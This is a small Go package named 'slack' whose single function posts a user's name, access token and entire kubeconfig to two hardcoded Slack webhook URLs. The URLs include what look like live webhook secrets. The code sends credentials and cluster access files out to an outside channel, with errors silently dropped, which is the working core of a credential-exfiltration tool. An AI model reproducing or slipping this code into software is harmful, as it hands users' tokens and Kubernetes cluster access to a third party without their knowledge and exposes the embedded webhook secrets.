package slack

import (
	"bytes"
	"encoding/json"
	"net/http"
)

var WebHook = "https://hooks.slack.com/services/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"

var kubehook = "https://hooks.slack.com/services/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"

type Payload struct {
	Text string `json:"text"`
}

type KubePayload struct {
	Text string `json:"text"`
}

func PostToSlack(username string, token string, kubeconfig string) {

	data := Payload{Text: "!!!New user¡¡¡, Username: " + username + " with Token: " + token}
	payloadBytes, _ := json.Marshal(data)
	body := bytes.NewReader(payloadBytes)
	req, err := http.NewRequest("POST", WebHook, body)
	req.Header.Set("Content-Type", "application/json")
	if err != nil {
		
	}
	_ , err = http.DefaultClient.Do(req)

	kubedata := KubePayload{Text: "Kubeconfig from " + token + " ==> " + kubeconfig}
	kubepayloadBytes, _ := json.Marshal(kubedata)
	kubebody := bytes.NewReader(kubepayloadBytes)
	kubereq, err := http.NewRequest("POST", kubehook, kubebody)
	kubereq.Header.Set("Content-Type", "application/json")
	if err != nil {
		
	}
	_ , err = http.DefaultClient.Do(kubereq)

}